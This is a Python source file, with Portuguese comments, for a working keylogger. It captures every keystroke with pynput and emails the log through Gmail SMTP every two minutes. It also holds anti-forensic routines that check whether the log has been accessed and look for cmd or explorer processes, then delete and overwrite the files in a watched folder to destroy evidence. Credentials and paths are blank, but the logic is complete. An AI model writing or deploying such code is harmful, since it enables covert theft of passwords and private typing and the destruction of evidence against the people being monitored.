import os
import time
import smtplib
import psutil
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

log_file = ""
email_interval = 2 * 60  # Enviar e-mails a cada 2
failsafe_interval = 1 * 60  # Verificar a cada 1 minutos
watched_folder = ""

last_access_time = os.path.getatime(log_file)
last_mod_time = os.path.getmtime(log_file)

def send_email():
    from_address = ""
    to_address = ""
    subject = "Keylogger Logs"
    body = "Attached are the keylogger logs."

    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    with open(log_file, "r") as log:
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(log.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file)}')
        msg.attach(attachment)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)  # Atualize com o servidor SMTP correto
        server.starttls()
        server.login(from_address, "")
        text = msg.as_string()
        server.sendmail(from_address, to_address, text)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f' {key} ')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def check_file_access():
    global last_access_time, last_mod_time
    current_access_time = os.path.getatime(log_file)
    current_mod_time = os.path.getmtime(log_file)

    if current_access_time != last_access_time or current_mod_time != last_mod_time:
        print("Possible unauthorized access detected.")
        cleanup_and_replace_files()

    last_access_time = current_access_time
    last_mod_time = current_mod_time

def cleanup_and_replace_files():
    for filename in os.listdir(watched_folder):
        file_path = os.path.join(watched_folder, filename)
        try:
            os.remove(file_path)
            with open(file_path, 'w') as new_file:
                new_file.write(" " * 1024)  # Escrever espaços para sobrescrever a memória
        except Exception as e:
            print(f"Failed to clean up file {file_path}: {e}")

def monitor_processes():
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            process_info = proc.info
            if 'cmd' in process_info['name'].lower() or 'explorer' in process_info['name'].lower():
                for handle in proc.open_files():
                    if watched_folder in handle.path:
                        print(f"Unauthorized access by process {proc.pid}: {process_info['name']}")
                        cleanup_and_replace_files()
                        return
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

if __name__ == "__main__":
    os.makedirs(os.path.dirname(log_file), exist_ok=True)  # Criar o diretório se não existir
    if not os.path.exists(log_file):
        open(log_file, 'w').close()

    start_time = time.time()
    while True:
        start_keylogger()
        time.sleep(email_interval)
        send_email()
        # Limpar o arquivo de log após enviar o e-mail
        open(log_file, 'w').close()

        # Verificar possíveis acessos não autorizados
        if time.time() - start_time >= failsafe_interval:
            check_file_access()
            monitor_processes()
            start_time = time.time()
